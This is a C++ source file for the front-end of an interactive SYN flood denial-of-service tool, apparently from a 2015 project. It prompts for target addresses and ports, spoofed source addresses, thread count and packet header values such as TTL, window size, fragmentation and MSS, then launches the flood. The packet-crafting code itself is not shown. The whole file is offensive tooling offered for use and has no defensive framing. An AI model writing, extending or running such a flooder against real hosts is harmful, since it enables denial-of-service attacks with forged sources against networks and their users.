#include "Application.h"

Application::Application(void)
{

	srand((unsigned int)time(NULL));

	memset(&_options,0,sizeof(SYNFLOOD_OPTIONS));

	_options.source_low = -1;
	_options.target_low = -1;
	_options.wnd_low = -1;

	_options.ttl_low = DEFAULT_TTL_MIN;
	_options.sport_low= DEFAULT_SPORT_MIN;
	_options.sport_high= 0xFFFF;
	_options.dport_high= 0xFFFF;
	_options.id_high = 0xFFFF;
	_options.wnd_high = 0xFFFF;	
	_options.mss_high = 0xFFFF;		
	_options.ttl_high = 0xFF;	
	_options.ttl_high = 0xFF;
	_options.sport_high= 0xFFFF;

	_synflood = new SYNFlood();

}

Application::~Application(void)
{
	delete _synflood;
}


void Application::DisplayHeaders()
{
	
	/* Display application headers */

	MyClear();

	cout << APP_NAME << " - version " << VERSION << endl;
	cout << "Copyright (C) 2015 Yubina - yubina@yubina.org" <<endl <<endl;


}

void Application::DisplayWelcome()
{
	/* Display welcome message */

	const char msg[] =  "Welcome. Please respect the developer.\nDo NOT distribute this software!";

	for(unsigned int i = 0; i < strlen(msg); ++i)
	{
		cout << msg[i];
		MySleep(50);
	}

}


int Application::Create()
{
	/* Create the application */

	DisplayHeaders();	
	

#ifdef SHOW_CAPTCHA
	
	DisplayWelcome();

	if(!Captcha::VerifyInput())
	{
		exit(0);
	}

	MyClear();
	
#endif

	if (GetParameters())
	{
		if (GetReadyState())
		{
			Run();
		}
	}

	return 0;
}

void Application::Run()
{
	/* Run the program */
		
	_synflood->Start(&_options);
			
}

bool Application::GetParameters()
{

	/* Get all of the application parameters */
			


#ifdef WIN32
	if (!GetNetworkDevice())
	{
		return false;
	}		
#endif
		

#ifndef SINGLE_THREADED
	GetThreadCount();
#endif

	GetTargets();
	GetTargetPorts();

	if (GetAdditionalOptions())
	{
		GetSources();
		GetSourcePorts();		
		GetIDValues();
		GetTTLValues();
		GetWindowLengths();	
		GetFragmentOptions();	
		GetMSSValues();		
	}						

	return true;

}

bool Application::GetAdditionalOptions()
{
	/* Determine whether or not user wants more options */

	string input;
	cout << endl << endl  << "Would you like more options: [n] " ;
	getline (cin,input);

	if (!input.empty())
	{
		if (input == "y")
		{
			return true;
		}
	}
	
	return false;
}

#ifdef WIN32
bool Application::GetNetworkDevice()
{
	



	/* Get the network interface device */
		
	unsigned int deviceId;
	string input;
	vector<N_DEVICE> devices;
	
	cout << endl <<  "Available network interface devices: " ;


	if (!GetNetworkDevices(devices))
	{
		cout << "None" <<endl <<endl;
		return false;
	}

	cout << endl << endl;
	

	for(unsigned int i = 0; i < devices.size(); ++i)
	{		 
		 cout << "\t" << i << "\t" << devices[i].description   <<endl; 
	}	

	while (true)
	{

		cout << endl << endl << "Please select a device: [0] ";
		getline (cin,input);

		deviceId = atoi(input.c_str());

		if (deviceId >= 0 && deviceId < devices.size())
		{
			break;
		}
		else
		{
			cout << "Invalid entry." << endl;
		}

	}

	memcpy(&_options.dev, &devices[deviceId], sizeof(N_DEVICE));
		

	
	if (!ResolveDestMac(&_options.dev))
	{
		return  false;
	}


	return true;
}

#endif


void Application::GetThreadCount()
{
	/* Get number of threads  */
		
	string input;
	
	int count;

	while(true)
	{
			
		cout << endl << endl  << "Enter the thread count (1 - " << MAX_THREADS << "): ["<< DEFAULT_THREADS<<"] " ;
		getline (cin,input);

		if (input.empty())
		{
			count = DEFAULT_THREADS;
		}
		else
		{
			count = atoi(input.c_str());
		}

		if(count < 1 || count > MAX_THREADS)
		{
			cout << endl << "Invalid entry." ;
		}
		else
		{
			_options.thread_count = count;
			break;
		}


	}	
	

}



void Application::GetTargets()
{

	/* Get target address or addresses */
	
	string input;
	vector<string> lines;
	vector<uint32_t> addresses;	

	while(true)
	{
		
		cout << endl << endl << "Enter the target address(s): " ;
		getline (cin,input);

		if (input.empty())
		{
			cout << endl << "No target specified!" ;
			continue;
		}
		else
		{	

			lines.clear();
			addresses.clear();
		

			if (!ReadFileIntoArray(input, lines))
			{
				input = ReplaceAll(input, " ", ",");

				if (GetNetworkRange(input, _options.target_low, _options.target_high ))
				{
					break;
				}
				else
				{
					if (!SortInputAddresses(input, addresses))
					{
						continue;
					}

				}
			}
			else
			{		
				if (!SortAddressList(lines, addresses))
				{
					continue;
				}						
			}

			_synflood->SetTargets(addresses);
			
			break;
			
		}
			
	}	
	
}


void Application::GetSources()
{
	
	
	/* Get the source address or list */ 
	
	//TODO: Implement CIDR notation for input	

	string input;
		
	while(true)
	{
		
		cout << endl << endl  << "Enter the source address(s): [random] " ;
		getline (cin,input);

		if (!input.empty())
		{
	
			vector<string> lines;
			vector<uint32_t> addresses;

			if (!ReadFileIntoArray(input, lines))
			{
				
				input = ReplaceAll(input, " ", ",");
				
				if (GetNetworkRange(input, _options.source_low, _options.source_high ))
				{
					break;
				}
				else
				{
					if (!SortInputAddresses(input, addresses))
					{
						continue;
					}

				}
			}
			else
			{		
				if (!SortAddressList(lines, addresses))
				{
					continue;
				}						
			}

			_synflood->SetSources(addresses);
						
		}	
		
		break;	

	}	
	
}


void Application::GetTargetPorts()
{
		
	/* Get the destination ports */ 
	
	vector<int> ports;


	while(true)
	{

		ports.clear();
		
		cout << endl << endl  << "Enter the destination port(s): [random] " ;
		
		if(!GetGenericValues(ports, 65535, _options.dport_low, _options.dport_high))
		{
			continue;
		}

		_synflood->SetTargetPorts(ports);

		break;

	}

}

void Application::GetSourcePorts()
{
		
	/* Get the source ports */ 
	
	vector<int> ports;


	while(true)
	{

		ports.clear();
		
		cout << endl << endl  << "Enter the source port(s): [random] " ;
		
		if(!GetGenericValues(ports, 65535, _options.sport_low, _options.sport_high))
		{
			continue;
		}

		_synflood->SetSourcePorts(ports);

		break;

	}

}

void Application::GetIDValues()
{
		
	/* Get the IDs */

	vector<int> ids;


	while(true)
	{

		ids.clear();


		cout << endl << endl  << "Enter the packet ID(s): [random] " ;


		if(!GetGenericValues(ids, 65535, _options.id_low, _options.id_high))
		{
			continue;
		}

		_synflood->SetIDValues(ids);

		break;

	}



}


void Application::GetTTLValues()
{
	/* Get the TTL values  */

	vector<int> ttls;


	while(true)
	{

		ttls.clear();


		cout << endl << endl  << "Enter the TTL value(s): [random] " ;


		if(!GetGenericValues(ttls, 255, _options.ttl_low, _options.ttl_high))
		{
			continue;
		}

		_synflood->SetTTLValues(ttls);

		break;

	}

}


void Application::GetWindowLengths()
{
	
	/* Get the window lengths */ 
	
	vector<int> wnds;


	while(true)
	{

		wnds.clear();

		cout << endl << endl  << "Enter the window length(s): [random] " ;

		if(!GetGenericValues(wnds, 65535, _options.wnd_low, _options.wnd_high))
		{
			continue;
		}

		_synflood->SetWindowLengths(wnds);

		break;

	}

}

void Application::GetFragmentOptions()
{
	/* Get the fragmentation option */

	vector<int> frags;


	while(true)
	{

		frags.clear();

		cout << endl << endl << "Fragmentation options: " << endl <<endl;

		cout << "\t0\tNo Fragment (IP_DF)" << endl;
		cout << "\t1\tMore Fragments (IP_MF)" << endl;
		cout << "\t2\tNone (0)" << endl;


		cout << endl << endl  << "Enter the fragmentation option: [0] " ;


		int a,b;

		if(!GetGenericValues(frags, 2, a,b))
		{
			continue;
		}

		_synflood->SetFragmentationOptions(frags);

		break;

	}


}




void Application::GetMSSValues()
{
	/* Get the MSS values  */

	vector<int> mss;


	while(true)
	{

		mss.clear();


		cout << endl << endl  << "Available MSS Options: " <<endl <<endl;		
		cout << _synflood->GetMSSOptions();
		cout  << endl << endl << "Choose the MSS options(s): [random] " ;


		if(!GetGenericValues(mss, _synflood->GetMSSCount(), _options.mss_low, _options.mss_high))
		{
			continue;
		}

		_synflood->SetMSSValues(mss);

		break;

	}

}



bool Application::GetGenericValues(vector<int> &list, int max, int &low, int &high )
{

	/* Get a generic value */

	string input;
	getline (cin,input);

	if (!input.empty())
	{

		vector<string> lines;


		if (!ReadFileIntoArray(input, lines))
		{
			if (!SortInputValues(input, list, max, low, high))
			{
				return false;
			}
		}
		else
		{
			if (!SortValueList(lines, list, max))
			{
				return false;
			}
		}

		lines.clear();


	}
	return true;
}

bool Application::GetReadyState()
{

	/* Get a user ready state */

	cout << endl << endl << "Are you ready?: [y]" ;
	
	string input;
	getline (cin,input);
	
	if (!input.empty())
	{
		if (input=="n" || input == "N")
		{
			return false;
		}
	}
	
	
	return true;
}
	
